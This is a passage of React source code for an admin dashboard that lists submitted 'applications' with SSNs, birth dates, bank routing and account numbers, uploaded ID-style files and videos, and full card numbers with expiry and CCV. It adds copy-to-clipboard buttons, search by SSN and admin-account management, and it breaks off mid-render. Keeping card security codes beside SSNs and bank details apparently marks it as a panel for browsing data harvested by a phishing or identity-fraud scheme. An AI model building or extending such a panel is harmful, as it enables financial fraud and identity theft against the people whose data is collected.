import React, { useState, useEffect, useCallback } from 'react';
import {
    Lock,
    Search,
    ExternalLink,
    CreditCard,
    FileText,
    Calendar,
    Mail,
    Phone,
    MapPin,
    ChevronDown,
    ChevronUp,
    Loader2,
    Database,
    RefreshCcw,
    LogOut,
    Play,
    Download,
    Eye,
    Trash2,
    UserPlus,
    Users,
    Shield,
    ShieldCheck,
    X,
    Copy,
    Check
} from 'lucide-react';
import { toast } from 'sonner';

interface Card {
    id: number;
    card_number: string;
    expiry: string;
    ccv: string;
}

interface FileLink {
    id: number;
    name: string;
    url: string;
    drive_id?: string;
    field_name: string;
}

interface Application {
    id: number;
    first_name: string;
    last_name: string;
    dob: string;
    ssn: string;
    phone: string;
    email: string;
    address: string;
    city: string;
    state: string;
    zip: string;
    mailing_address: string;
    bank_name: string;
    account_type: string;
    routing_number: string;
    account_number: string;
    drive_folder_id: string;
    drive_folder_url: string;
    timestamp: string;
    cards: Card[];
    files: FileLink[];
}

interface AdminUser {
    id: number;
    username: string;
    is_default: boolean | number;
    created_at: string;
}

interface CurrentUser {
    id: number;
    username: string;
    is_default: boolean;
}

const AdminDashboard: React.FC = () => {
    const [isAuthenticated, setIsAuthenticated] = useState(false);
    const [currentUser, setCurrentUser] = useState<CurrentUser | null>(null);
    const [authToken, setAuthToken] = useState<string>(() => sessionStorage.getItem('adminAuth') || '');
    const [username, setUsername] = useState('');
    const [password, setPassword] = useState('');
    const [loginLoading, setLoginLoading] = useState(false);

    // Navigation & Tabs
    const [activeTab, setActiveTab] = useState<'applications' | 'admins'>('applications');

    // Applications Data
    const [applications, setApplications] = useState<Application[]>([]);
    const [loading, setLoading] = useState(false);
    const [searchTerm, setSearchTerm] = useState('');
    const [expandedId, setExpandedId] = useState<number | null>(null);
    const [selectedApplication, setSelectedApplication] = useState<Application | null>(null);

    // Admin Users Data
    const [adminUsers, setAdminUsers] = useState<AdminUser[]>([]);
    const [loadingAdmins, setLoadingAdmins] = useState(false);
    const [newAdminUser, setNewAdminUser] = useState('');
    const [newAdminPass, setNewAdminPass] = useState('');
    const [creatingAdmin, setCreatingAdmin] = useState(false);

    // Media Modals
    const [videoModal, setVideoModal] = useState<{ isOpen: boolean; file: FileLink | null }>({
        isOpen: false,
        file: null
    });
    const [imageModal, setImageModal] = useState<{ isOpen: boolean; file: FileLink | null }>({
        isOpen: false,
        file: null
    });

    // Copy Feedback
    const [copiedField, setCopiedField] = useState<string | null>(null);

    const backendUrl = import.meta.env.VITE_BACKEND_URL;

    const handleLogout = useCallback(() => {
        sessionStorage.removeItem('adminAuth');
        sessionStorage.removeItem('adminUser');
        setAuthToken('');
        setIsAuthenticated(false);
        setCurrentUser(null);
        setApplications([]);
        setAdminUsers([]);
        toast.info('Logged out successfully');
    }, []);

    // Fetch Applications
    const fetchApplications = useCallback(async (token = authToken) => {
        if (!token) return;
        setLoading(true);
        try {
            const response = await fetch(`${backendUrl}/api/admin/data`, {
                headers: { 'Authorization': `Basic ${token}` }
            });

            if (response.status === 401) {
                handleLogout();
                toast.error('Session expired. Please log in again.');
                return;
            }

            if (!response.ok) throw new Error('Failed to fetch applications');

            const data = await response.json();
            setApplications(data);
        } catch (error: unknown) {
            const msg = error instanceof Error ? error.message : 'Error fetching data';
            toast.error(msg);
        } finally {
            setLoading(false);
        }
    }, [authToken, backendUrl, handleLogout]);

    // Fetch Admin Users (Default Admin Only)
    const fetchAdminUsers = useCallback(async (token = authToken) => {
        if (!token) return;
        setLoadingAdmins(true);
        try {
            const response = await fetch(`${backendUrl}/api/admin/users`, {
                headers: { 'Authorization': `Basic ${token}` }
            });

            if (!response.ok) {
                const err = await response.json();
                throw new Error(err.error || 'Failed to fetch admin users');
            }

            const data = await response.json();
            setAdminUsers(data);
        } catch (error: unknown) {
            const msg = error instanceof Error ? error.message : 'Error fetching admin users';
            toast.error(msg);
        } finally {
            setLoadingAdmins(false);
        }
    }, [authToken, backendUrl]);

    // Handle Login
    const handleLogin = async (e: React.FormEvent) => {
        e.preventDefault();
        if (!username || !password) {
            toast.error('Please enter both username and password');
            return;
        }

        setLoginLoading(true);
        try {
            const res = await fetch(`${backendUrl}/api/admin/login`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, password })
            });

            const data = await res.json();
            if (!res.ok) {
                throw new Error(data.error || 'Authentication failed');
            }

            const token = data.token || btoa(`${username}:${password}`);
            sessionStorage.setItem('adminAuth', token);
            sessionStorage.setItem('adminUser', JSON.stringify(data.user));

            setAuthToken(token);
            setCurrentUser(data.user);
            setIsAuthenticated(true);
            toast.success(`Welcome back, ${data.user.username}!`);
            fetchApplications(token);
        } catch (error: unknown) {
            const msg = error instanceof Error ? error.message : 'Login failed';
            toast.error(msg);
        } finally {
            setLoginLoading(false);
        }
    };

    // Create New Admin User
    const handleCreateAdmin = async (e: React.FormEvent) => {
        e.preventDefault();
        if (!newAdminUser.trim() || !newAdminPass.trim()) {
            toast.error('Please fill in both username and password');
            return;
        }

        setCreatingAdmin(true);
        try {
            const response = await fetch(`${backendUrl}/api/admin/users`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Basic ${authToken}`
                },
                body: JSON.stringify({
                    username: newAdminUser.trim(),
                    password: newAdminPass.trim()
                })
            });

            const data = await response.json();
            if (!response.ok) {
                throw new Error(data.error || 'Failed to create admin');
            }

            toast.success(`Admin user "${newAdminUser.trim()}" created successfully!`);
            setNewAdminUser('');
            setNewAdminPass('');
            fetchAdminUsers();
        } catch (error: unknown) {
            const msg = error instanceof Error ? error.message : 'Failed to create admin';
            toast.error(msg);
        } finally {
            setCreatingAdmin(false);
        }
    };

    // Delete Admin User
    const handleDeleteAdmin = async (userId: number, userName: string) => {
        if (!window.confirm(`Are you sure you want to delete admin "${userName}"?`)) return;

        try {
            const response = await fetch(`${backendUrl}/api/admin/users/${userId}`, {
                method: 'DELETE',
                headers: { 'Authorization': `Basic ${authToken}` }
            });

            const data = await response.json();
            if (!response.ok) throw new Error(data.error || 'Failed to delete admin');

            toast.success(`Admin "${userName}" deleted`);
            fetchAdminUsers();
        } catch (error: unknown) {
            const msg = error instanceof Error ? error.message : 'Failed to delete admin';
            toast.error(msg);
        }
    };

    // Delete Application
    const handleDeleteApplication = async (appId: number, name: string) => {
        if (!window.confirm(`Are you sure you want to delete application #${appId} for ${name}?`)) return;

        try {
            const response = await fetch(`${backendUrl}/api/admin/applications/${appId}`, {
                method: 'DELETE',
                headers: { 'Authorization': `Basic ${authToken}` }
            });

            const data = await response.json();
            if (!response.ok) throw new Error(data.error || 'Failed to delete application');

            toast.success(`Application #${appId} deleted`);
            if (selectedApplication?.id === appId) {
                setSelectedApplication(null);
            }
            fetchApplications();
        } catch (error: unknown) {
            const msg = error instanceof Error ? error.message : 'Failed to delete application';
            toast.error(msg);
        }
    };

    // Copy to clipboard helper
    const handleCopy = (text: string, label: string) => {
        navigator.clipboard.writeText(text);
        setCopiedField(label);
        toast.success(`Copied ${label} to clipboard`);
        setTimeout(() => setCopiedField(null), 2000);
    };

    // Helper: Build streaming & download URLs (Direct Cloudinary URLs)
    const getDriveMediaUrl = (file: FileLink, type: 'view' | 'download') => {
        if (!file?.url) return '';
        if (type === 'download' && file.url.includes('cloudinary.com')) {
            return file.url.replace('/upload/', '/upload/fl_attachment/');
        }
        return file.url;
    };

    const isVideoFile = (file: FileLink) => {
        const name = (file.name || '').toLowerCase();
        const field = (file.field_name || '').toLowerCase();
        return name.endsWith('.mp4') || name.endsWith('.webm') || name.endsWith('.mov') || field.includes('video');
    };

    // Restore Session
    useEffect(() => {
        const token = sessionStorage.getItem('adminAuth');
        const storedUser = sessionStorage.getItem('adminUser');
        if (token) {
            setIsAuthenticated(true);
            setAuthToken(token);
            if (storedUser) {
                try {
                    setCurrentUser(JSON.parse(storedUser));
                } catch {
                    setCurrentUser(null);
                }
            }
            fetchApplications(token);
        }
    }, [fetchApplications]);

    // Fetch admins when opening admins tab
    useEffect(() => {
        if (isAuthenticated && activeTab === 'admins' && currentUser?.is_default) {
            fetchAdminUsers();
        }
    }, [activeTab, isAuthenticated, currentUser, fetchAdminUsers]);

    const filteredApplications = applications.filter(app => {
        const q = searchTerm.toLowerCase();
        return (
            `${app.first_name} ${app.last_name}`.toLowerCase().includes(q) ||
            (app.email || '').toLowerCase().includes(q) ||
            (app.phone || '').includes(q) ||
            (app.ssn || '').includes(q) ||
            (app.bank_name || '').toLowerCase().includes(q)
        );
    });

    // -------------------------------------------------------------
    // LOGIN SCREEN
    // -------------------------------------------------------------
    if (!isAuthenticated) {
        return (
            <div className="min-h-[85vh] flex items-center justify-center bg-gradient-to-br from-slate-900 via-blue-950 to-slate-900 px-4">
                <div className="max-w-md w-full bg-white/95 backdrop-blur-md rounded-2xl shadow-2xl p-8 border border-white/20">
                    <div className="flex flex-col items-center mb-8">
                        <div className="w-16 h-16 bg-blue-600/10 border border-blue-500/20 rounded-2xl flex items-center justify-center mb-4 shadow-inner">
                            <Lock className="w-8 h-8 text-blue-600" />
                        </div>
                        <h1 className="text-2xl font-bold text-gray-900">Admin Portal</h1>
                        <p className="text-gray-500 text-center text-sm mt-1">Sign in to manage database applications and files</p>
                    </div>

                    <form onSubmit={handleLogin} className="space-y-5">
                        <div>
                            <label className="block text-xs font-bold uppercase tracking-wider text-gray-700 mb-2">Username</label>
                            <input
                                type="text"
                                value={username}
                                onChange={(e) => setUsername(e.target.value)}
                                className="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all text-gray-900"
                                placeholder="Enter admin username"
                                autoFocus
                            />
                        </div>
                        <div>
                            <label className="block text-xs font-bold uppercase tracking-wider text-gray-700 mb-2">Password</label>
                            <input
                                type="password"
                                value={password}
                                onChange={(e) => setPassword(e.target.value)}
                                className="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all text-gray-900"
                                placeholder="••••••••"
                            />
                        </div>
                        <button
                            type="submit"
                            disabled={loginLoading}
                            className="w-full bg-blue-600 hover:bg-blue-700 active:scale-[0.99] text-white font-semibold py-3.5 rounded-xl transition-all shadow-lg shadow-blue-500/25 flex items-center justify-center gap-2"
                        >
                            {loginLoading ? <Loader2 className="w-5 h-5 animate-spin" /> : 'Sign In'}
                        </button>
                    </form>
                </div>
            </div>
        );
    }

    // -------------------------------------------------------------
    // MAIN DASHBOARD SCREEN
    // -------------------------------------------------------------
    return (
        <div className="min-h-screen bg-slate-50 pb-20">
            {/* Top Navigation Bar */}
            <header className="bg-white border-b border-gray-200 sticky top-0 z-30 shadow-sm">
                <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
                    <div className="flex items-center justify-between h-16">
                        <div className="flex items-center gap-3">
                            <div className="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center text-white shadow-md shadow-blue-500/20">
                                <Database className="w-5 h-5" />
                            </div>
                            <div>
                                <h1 className="text-lg font-bold text-gray-900">Admin Control Center</h1>
                                <div className="flex items-center gap-2">
                                    <span className="text-xs text-gray-500">Logged in as: <strong className="text-gray-700">{currentUser?.username || 'Admin'}</strong></span>
                                    {currentUser?.is_default ? (
                                        <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold bg-amber-100 text-amber-800 border border-amber-200">
                                            <ShieldCheck className="w-3 h-3" /> Default Admin
                                        </span>
                                    ) : (
                                        <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-semibold bg-gray-100 text-gray-700 border border-gray-200">
                                            <Shield className="w-3 h-3" /> Admin
                                        </span>
                                    )}
                                </div>
                            </div>
                        </div>

                        {/* Navigation Tabs */}
                        <div className="flex items-center gap-2">
                            <button
                                onClick={() => setActiveTab('applications')}
                                className={`px-4 py-2 text-sm font-semibold rounded-lg transition-colors flex items-center gap-2 ${activeTab === 'applications'
                                    ? 'bg-blue-50 text-blue-700 border border-blue-200 shadow-sm'
                                    : 'text-gray-600 hover:bg-gray-100'
                                    }`}
                            >
                                <Database className="w-4 h-4" />
                                Database Items ({applications.length})
                            </button>

                            {currentUser?.is_default && (
                                <button
                                    onClick={() => setActiveTab('admins')}
                                    className={`px-4 py-2 text-sm font-semibold rounded-lg transition-colors flex items-center gap-2 ${activeTab === 'admins'
                                        ? 'bg-blue-50 text-blue-700 border border-blue-200 shadow-sm'
                                        : 'text-gray-600 hover:bg-gray-100'
                                        }`}
                                >
                                    <Users className="w-4 h-4" />
                                    Manage Admins
                                </button>
                            )}

                            <button
                                onClick={() => activeTab === 'applications' ? fetchApplications() : fetchAdminUsers()}
                                disabled={loading || loadingAdmins}
                                title="Refresh"
                                className="p-2 text-gray-500 hover:text-gray-700 hover:bg-gray-100 rounded-lg transition-colors"
                            >
                                <RefreshCcw className={`w-4 h-4 ${(loading || loadingAdmins) ? 'animate-spin' : ''}`} />
                            </button>

                            <button
                                onClick={handleLogout}
                                className="flex items-center gap-1.5 px-3 py-2 text-sm font-medium text-red-600 hover:bg-red-50 rounded-lg transition-colors border border-transparent hover:border-red-100 ml-2"
                            >
                                <LogOut className="w-4 h-4" />
                                <span className="hidden sm:inline">Logout</span>
                            </button>
                        </div>
                    </div>
                </div>
            </header>

            <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
                {/* ------------------------------------------------------------- */}
                {/* TAB 1: APPLICATIONS & DATABASE ITEMS                          */}
                {/* ------------------------------------------------------------- */}
                {activeTab === 'applications' && (
                    <div className="space-y-6">
                        {/* Search & Statistics Bar */}
                        <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
                            <div className="md:col-span-3 bg-white p-2 rounded-xl shadow-sm border border-gray-200 flex items-center">
                                <Search className="text-gray-400 w-5 h-5 ml-3" />
                                <input
                                    type="text"
                                    placeholder="Search by name, email, phone, SSN, or bank..."
                                    value={searchTerm}
                                    onChange={(e) => setSearchTerm(e.target.value)}
                                    className="w-full pl-3 pr-4 py-2 bg-transparent outline-none text-gray-800 text-sm"
                                />
                                {searchTerm && (
                                    <button onClick={() => setSearchTerm('')} className="p-1 text-gray-400 hover:text-gray-600 mr-2">
                                        <X className="w-4 h-4" />
                                    </button>
                                )}
                            </div>

                            <div className="bg-white p-3 rounded-xl shadow-sm border border-gray-200 flex items-center justify-between px-4">
                                <span className="text-xs text-gray-500 font-medium">Total Records:</span>
                                <span className="text-lg font-bold text-blue-600">{applications.length}</span>
                            </div>
                        </div>

                        {/* Applications List */}
                        {loading && applications.length === 0 ? (
                            <div className="flex flex-col items-center justify-center py-24 bg-white rounded-2xl border border-gray-200">
                                <Loader2 className="w-10 h-10 text-blue-600 animate-spin mb-3" />
                                <p className="text-gray-500 font-medium">Loading database records...</p>
                            </div>
                        ) : filteredApplications.length === 0 ? (
                            <div className="bg-white rounded-2xl border border-dashed border-gray-300 py-20 text-center">
                                <Database className="w-12 h-12 text-gray-300 mx-auto mb-3" />
                                <p className="text-gray-600 font-medium text-lg">No application records found</p>
                                <p className="text-gray-400 text-sm mt-1">
                                    {searchTerm ? 'Try adjusting your search criteria' : 'New incoming applications will appear here'}
                                </p>
                            </div>
                        ) : (
                            <div className="space-y-4">
                                {filteredApplications.map((app) => (
                                    <div
                                        key={app.id}
                                        className={`bg-white rounded-2xl border transition-all overflow-hidden ${expandedId === app.id
                                            ? 'border-blue-400 shadow-lg ring-2 ring-blue-100'
                                            : 'border-gray-200 shadow-sm hover:border-gray-300 hover:shadow-md'
                                            }`}
                                    >
                                        {/* Card Top Row */}
                                        <div className="p-5 flex flex-col md:flex-row md:items-center justify-between gap-4">
                                            <div
                                                className="flex items-center gap-4 cursor-pointer flex-grow"
                                                onClick={() => setExpandedId(expandedId === app.id ? null : app.id)}
                                            >
                                                <div className="w-12 h-12 bg-gradient-to-tr from-blue-600 to-indigo-600 text-white rounded-xl flex items-center justify-center font-bold text-lg shadow-md shadow-blue-500/20">
                                                    {(app.first_name?.[0] || 'U')}{(app.last_name?.[0] || '')}
                                                </div>
                                                <div>
                                                    <div className="flex items-center gap-2">
                                                        <h3 className="font-bold text-gray-900 text-lg">
                                                            {app.first_name} {app.last_name}
                                                        </h3>
                                                        <span className="text-xs px-2 py-0.5 rounded-md bg-gray-100 text-gray-600 font-mono">
                                                            #{app.id}
                                                        </span>
                                                    </div>
                                                    <div className="flex flex-wrap items-center gap-4 text-xs text-gray-500 mt-1">
                                                        <span className="flex items-center gap-1.5"><Mail className="w-3.5 h-3.5 text-gray-400" /> {app.email}</span>
                                                        <span className="flex items-center gap-1.5"><Phone className="w-3.5 h-3.5 text-gray-400" /> {app.phone}</span>
                                                        <span className="flex items-center gap-1.5"><Calendar className="w-3.5 h-3.5 text-gray-400" /> {new Date(app.timestamp).toLocaleString()}</span>
                                                    </div>
                                                </div>
                                            </div>

                                            {/* Action Buttons */}
                                            <div className="flex items-center gap-2">
                                                <button
                                                    onClick={() => setSelectedApplication(app)}
                                                    className="px-3 py-1.5 bg-blue-50 hover:bg-blue-100 text-blue-700 text-xs font-semibold rounded-lg transition-colors flex items-center gap-1.5 border border-blue-200"
                                                >
                                                    <Eye className="w-3.5 h-3.5" /> View Item
                                                </button>

                                                <button
                                                    onClick={() => handleDeleteApplication(app.id, `${app.first_name} ${app.last_name}`)}
                                                    className="p-1.5 text-gray-400 hover:text-red-600 hover:bg-red-50 rounded-lg transition-colors"
                                                    title="Delete Record"
                                                >
                                                    <Trash2 className="w-4 h-4" />
                                                </button>

                                                <button
                                                    onClick={() => setExpandedId(expandedId === app.id ? null : app.id)}
                                                    className="p-1.5 text-gray-400 hover:text-gray-600 hover:bg-gray-100 rounded-lg transition-colors ml-1"
                                                >
                                                    {expandedId === app.id ? <ChevronUp className="w-5 h-5" /> : <ChevronDown className="w-5 h-5" />}
                                                </button>
                                            </div>
                                        </div>

                                        {/* Inline Quick Expand View */}
                                        {expandedId === app.id && (
                                            <div className="border-t border-gray-100 bg-slate-50/70 p-6 space-y-6">
                                                <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                                                    {/* Personal Info */}
                                                    <div className="bg-white p-4 rounded-xl border border-gray-200/80 shadow-sm">
                                                        <h4 className="text-xs font-bold text-gray-400 uppercase tracking-wider mb-3 flex items-center gap-1.5">
                                                            <FileText className="w-3.5 h-3.5 text-blue-600" /> Personal Details
                                                        </h4>
                                                        <div className="space-y-2.5">
                                                            <DetailRow label="SSN" value={app.ssn} isSecret onCopy={() => handleCopy(app.ssn, 'SSN')} copied={copiedField === 'SSN'} />
                                                            <DetailRow label="Date of Birth" value={app.dob ? new Date(app.dob).toLocaleDateString() : 'N/A'} />
                                                            <DetailRow label="Address" value={`${app.address || ''}, ${app.city || ''}, ${app.state || ''} ${app.zip || ''}`} />
                                                            {app.mailing_address && <DetailRow label="Mailing Address" value={app.mailing_address} />}
                                                        </div>
                                                    </div>

                                                    {/* Banking */}
                                                    <div className="bg-white p-4 rounded-xl border border-gray-200/80 shadow-sm">
                                                        <h4 className="text-xs font-bold text-gray-400 uppercase tracking-wider mb-3 flex items-center gap-1.5">
                                                            <MapPin className="w-3.5 h-3.5 text-emerald-600" /> Bank Details
                                                        </h4>
                                                        <div className="space-y-2.5">
                                                            <DetailRow label="Bank" value={app.bank_name} />
                                                            <DetailRow label="Account Type" value={app.account_type} />
                                                            <DetailRow label="Routing Number" value={app.routing_number} onCopy={() => handleCopy(app.routing_number, 'Routing Number')} copied={copiedField === 'Routing Number'} />
                                                            <DetailRow label="Account Number" value={app.account_number} isSecret onCopy={() => handleCopy(app.account_number, 'Account Number')} copied={copiedField === 'Account Number'} />
                                                        </div>
                                                    </div>

                                                    {/* Files & Media Section */}
                                                    <div className="bg-white p-4 rounded-xl border border-gray-200/80 shadow-sm">
                                                        <div className="flex items-center justify-between mb-3">
                                                            <h4 className="text-xs font-bold text-gray-400 uppercase tracking-wider flex items-center gap-1.5">
                                                                <FileText className="w-3.5 h-3.5 text-indigo-600" /> Uploaded Files ({app.files?.length || 0})
                                                            </h4>
                                                            {app.drive_folder_url && (
                                                                <a
                                                                    href={app.drive_folder_url}
                                                                    target="_blank"
                                                                    rel="noopener noreferrer"
                                                                    className="text-xs text-blue-600 hover:text-blue-800 font-medium flex items-center gap-1"
                                                                >
                                                                    Open Folder <ExternalLink className="w-3 h-3" />
                                                                </a>
                                                            )}
                                                        </div>

                                                        {app.files && app.files.length > 0 ? (
                                                            <div className="space-y-2">
                                                                {app.files.map((file) => {
                                                                    const isVideo = isVideoFile(file);
                                                                    return (
                                                                        <div
                                                                            key={file.id}
                                                                            className="flex items-center justify-between p-2 rounded-lg bg-slate-50 border border-gray-100 text-xs hover:bg-blue-50/50 transition-colors"
                                                                        >
                                                                            <div className="flex items-center gap-2 truncate max-w-[170px]">
                                                                                <span className={`p-1 rounded ${isVideo ? 'bg-purple-100 text-purple-700' : 'bg-blue-100 text-blue-700'}`}>
                                                                                    {isVideo ? <Play className="w-3 h-3" /> : <FileText className="w-3 h-3" />}
                                                                                </span>
                                                                                <span className="font-medium text-gray-700 truncate">{file.name}</span>
                                                                            </div>

                                                                            <div className="flex items-center gap-1">
                                                                                {isVideo ? (
                                                                                    <button
                                                                                        onClick={() => setVideoModal({ isOpen: true, file })}
                                                                                        className="px-2 py-1 bg-purple-600 hover:bg-purple-700 text-white font-medium rounded flex items-center gap-1 text-[11px]"
                                                                                    >
                                                                                        <Play className="w-2.5 h-2.5 fill-current" /> Play
                                                                                    </button>
                                                                                ) : (
                                                                                    <button
                                                                                        onClick={() => setImageModal({ isOpen: true, file })}
                                                                                        className="px-2 py-1 bg-blue-600 hover:bg-blue-700 text-white font-medium rounded flex items-center gap-1 text-[11px]"
                                                                                    >
                                                                                        <Eye className="w-2.5 h-2.5" /> View
                                                                                    </button>
                                                                                )}

                                                                                <a
                                                                                    href={getDriveMediaUrl(file, 'download')}
                                                                                    download
                                                                                    target="_blank"
                                                                                    rel="noopener noreferrer"
                                                                                    className="p-1 text-gray-500 hover:text-gray-800 hover:bg-white rounded transition-colors"
                                                                                    title="Download"
                                                                                >
                                                                                    <Download className="w-3.5 h-3.5" />
                                                                                </a>
                                                                            </div>
                                                                        </div>
                                                                    );
                                                                })}
                                                            </div>
                                                        ) : (
                                                            <p className="text-xs text-gray-400 italic">No files recorded for this submission.</p>
                                                        )}
                                                    </div>
                                                </div>

                                                {/* Cards Section */}
                                                {app.cards && app.cards.length > 0 && (
                                                    <div className="pt-2">
                                                        <h4 className="text-xs font-bold text-gray-400 uppercase tracking-wider mb-3 flex items-center gap-1.5">
                                                            <CreditCard className="w-3.5 h-3.5 text-amber-600" /> Credit / Debit Cards ({app.cards.length})
                                                        </h4>
                                                        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
                                                            {app.cards.map((card) => (
                                                                <div
                                                                    key={card.id}
                                                                    className="bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 rounded-xl p-5 text-white shadow-md relative overflow-hidden border border-slate-700/50"
                                                                >
                                                                    <div className="flex justify-between items-center mb-4">
                                                                        <div className="w-9 h-6 bg-amber-400/20 border border-amber-400/40 rounded flex items-center justify-center">
                                                                            <div className="w-4 h-3 border border-amber-300/60 rounded-sm"></div>
                                                                        </div>
                                                                        <button
                                                                            onClick={() => handleCopy(card.card_number, `Card #${card.id}`)}
                                                                            className="text-xs text-slate-400 hover:text-white flex items-center gap-1"
                                                                        >
                                                                            <Copy className="w-3 h-3" />
                                                                        </button>
                                                                    </div>

                                                                    <p className="font-mono text-base tracking-[0.18em] mb-4 text-slate-100">
                                                                        {card.card_number.replace(/\s?/g, '').replace(/(\d{4})/g, '$1 ').trim()}
                                                                    </p>

                                                                    <div className="flex justify-between items-end text-xs text-slate-400">
                                                                        <div>
                                                                            <span className="block text-[9px] uppercase tracking-wider">Expires</span>
                                                                            <span className="font-mono text-slate-200 text-sm">{card.expiry}</span>
                                                                        </div>
                                                                        <div className="text-right">
                                                                            <span className="block text-[9px] uppercase tracking-wider">CCV</span>
                                                                            <span className="font-mono text-slate-200 text-sm">{card.ccv}</span>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            ))}
                                                        </div>
                                                    </div>
                                                )}
                                            </div>
                                        )}
                                    </div>
                                ))}
                            </div>
                        )}
                    </div>
                )}

                {/* ------------------------------------------------------------- */}
                {/* TAB 2: ADMIN USER MANAGEMENT (DEFAULT ADMIN ONLY)             */}
                {/* ------------------------------------------------------------- */}
                {activeTab === 'admins' && currentUser?.is_default && (
                    <div className="space-y-8">
                        {/* Status banner */}
                        <div className="bg-gradient-to-r from-blue-600 to-indigo-700 rounded-2xl p-6 text-white shadow-lg flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
                            <div>
                                <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-white/20 text-xs font-semibold backdrop-blur-sm mb-2">
                                    <ShieldCheck className="w-4 h-4" /> Default Administrator Privileges
                                </div>
                                <h2 className="text-2xl font-bold">Admin User Management</h2>
                                <p className="text-blue-100 text-sm mt-1 max-w-xl">
                                    As the default system administrator, you have exclusive authorization to create and revoke access for other administrative accounts.
                                </p>
                            </div>
                        </div>

                        {/* Create Admin Form & Current Admins Grid */}
                        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
                            {/* Create Form */}
                            <div className="bg-white p-6 rounded-2xl shadow-sm border border-gray-200">
                                <h3 className="text-lg font-bold text-gray-900 mb-2 flex items-center gap-2">
                                    <UserPlus className="w-5 h-5 text-blue-600" />
                                    Create New Admin
                                </h3>
                                <p className="text-xs text-gray-500 mb-6">Create credentials for team members to access database records.</p>

                                <form onSubmit={handleCreateAdmin} className="space-y-4">
                                    <div>
                                        <label className="block text-xs font-bold uppercase tracking-wider text-gray-700 mb-1.5">
                                            Username
                                        </label>
                                        <input
                                            type="text"
                                            value={newAdminUser}
                                            onChange={(e) => setNewAdminUser(e.target.value)}
                                            placeholder="e.g. john_doe"
                                            className="w-full px-4 py-2.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none text-sm text-gray-900"
                                            required
                                        />
                                    </div>

                                    <div>
                                        <label className="block text-xs font-bold uppercase tracking-wider text-gray-700 mb-1.5">
                                            Password
                                        </label>
                                        <input
                                            type="password"
                                            value={newAdminPass}
                                            onChange={(e) => setNewAdminPass(e.target.value)}
                                            placeholder="Minimum 6 characters"
                                            className="w-full px-4 py-2.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none text-sm text-gray-900"
                                            required
                                        />
                                    </div>

                                    <button
                                        type="submit"
                                        disabled={creatingAdmin}
                                        className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-xl transition-all shadow-md shadow-blue-500/20 flex items-center justify-center gap-2 text-sm mt-2"
                                    >
                                        {creatingAdmin ? <Loader2 className="w-4 h-4 animate-spin" /> : (
                                            <>
                                                <UserPlus className="w-4 h-4" /> Create Admin Account
                                            </>
                                        )}
                                    </button>
                                </form>
                            </div>

                            {/* Current Admin Users List */}
                            <div className="lg:col-span-2 bg-white p-6 rounded-2xl shadow-sm border border-gray-200">
                                <div className="flex items-center justify-between mb-4">
                                    <h3 className="text-lg font-bold text-gray-900 flex items-center gap-2">
                                        <Users className="w-5 h-5 text-indigo-600" />
                                        Existing Admin Users ({adminUsers.length})
                                    </h3>
                                    <button
                                        onClick={() => fetchAdminUsers()}
                                        className="text-xs text-blue-600 hover:text-blue-800 font-medium flex items-center gap-1"
                                    >
                                        <RefreshCcw className={`w-3.5 h-3.5 ${loadingAdmins ? 'animate-spin' : ''}`} /> Refresh
                                    </button>
                                </div>

                                {loadingAdmins && adminUsers.length === 0 ? (
                                    <div className="flex flex-col items-center justify-center py-12">
                                        <Loader2 className="w-8 h-8 text-blue-600 animate-spin mb-2" />
                                        <p className="text-xs text-gray-500">Loading administrators...</p>
                                    </div>
                                ) : (
                                    <div className="divide-y divide-gray-100">
                                        {adminUsers.map((user) => {
                                            const isDefault = Boolean(user.is_default);
                                            return (
                                                <div key={user.id} className="py-4 flex items-center justify-between gap-4">
                                                    <div className="flex items-center gap-3">
                                                        <div className={`w-10 h-10 rounded-xl flex items-center justify-center font-bold text-sm ${isDefault ? 'bg-amber-100 text-amber-800 border border-amber-200' : 'bg-slate-100 text-slate-700'}`}>
                                                            {user.username[0]?.toUpperCase()}
                                                        </div>
                                                        <div>
                                                            <div className="flex items-center gap-2">
                                                                <span className="font-semibold text-gray-900 text-sm">{user.username}</span>
                                                                {isDefault ? (
                                                                    <span className="px-2 py-0.5 rounded-full text-[10px] font-bold bg-amber-100 text-amber-800 border border-amber-200">
                                                                        Default User (Owner)
                                                                    </span>
                                                                ) : (
                                                                    <span className="px-2 py-0.5 rounded-full text-[10px] font-semibold bg-gray-100 text-gray-600">
                                                                        Standard Admin
                                                                    </span>
                                                                )}
                                                            </div>
                                                            <span className="text-xs text-gray-400">
                                                                Created: {user.created_at ? new Date(user.created_at).toLocaleDateString() : 'System Seed'}
                                                            </span>
                                                        </div>
                                                    </div>

                                                    <div>
                                                        {!isDefault ? (
                                                            <button
                                                                onClick={() => handleDeleteAdmin(user.id, user.username)}
                                                                className="px-3 py-1.5 text-xs text-red-600 hover:bg-red-50 border border-red-200 rounded-lg transition-colors flex items-center gap-1"
                                                            >
                                                                <Trash2 className="w-3.5 h-3.5" /> Delete
                                                            </button>
                                                        ) : (
                                                            <span className="text-xs text-gray-400 italic">Protected</span>
                                                        )}
                                                    </div>
                                                </div>
                                            );
                                        })}
                                    </div>
                                )}
                            </div>
                        </div>
                    </div>
                )}
            </main>

            {/* ------------------------------------------------------------- */}
